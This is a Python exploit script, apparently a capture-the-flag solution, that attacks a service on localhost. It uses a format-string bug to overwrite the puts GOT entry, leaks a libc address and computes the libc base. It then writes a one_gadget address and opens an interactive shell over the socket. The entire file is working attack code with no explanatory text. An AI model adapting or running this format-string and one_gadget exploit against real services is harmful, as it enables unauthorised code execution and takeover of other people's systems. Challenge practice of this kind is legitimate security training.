import socket, struct, time, codecs, telnetlib


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10004))
# s.connect(('localhost', 4088))


def make(value):
    payload = ''
    addr_got_puts = 0x601018

    payload = ''
    payload += '%43$016p'

    i_start = 9 + 0x80 // 8 - 1
    written = 16  # '%43$016p' will print 16 bytes
    print(value.to_bytes(6, 'little'))
    for i, ch in enumerate(value.to_bytes(6, 'little')):
        pad = (ch - written) % 256
        if pad <= 1:
            pad += 256
        payload += '%{pad}c%{index}$hhn'.format(pad=pad, index=i_start+i)
        written = ch

    payload = payload.ljust(0x80, '\x00')

    # print("len until addresses = {}".format(hex(len(payload))))
    payload = bytes(payload, 'ascii')
    for i in range(6):
        payload += struct.pack('<Q', 0x601018+i)

    payload = codecs.decode(payload, 'latin-1')
    payload = codecs.decode(payload, 'rot-13')
    payload = codecs.encode(payload, 'latin-1')

    # print(payload)
    # print(hex(len(payload)))
    return payload + b'\n'


payload = make(0x4007a2)
s.sendall(payload)

time.sleep(1)
data = s.recv(9999)
print(data)
addr_libc = int(data[:data.find(b'97')+2], 16) - 0x21b97
print(hex(addr_libc))

one_gadgets = [324293, 324386, 1090444]
payload = make(addr_libc + one_gadgets[2])
s.sendall(payload)

time.sleep(1)
s.recv(9999)

t = telnetlib.Telnet()
t.sock = s
t.interact()
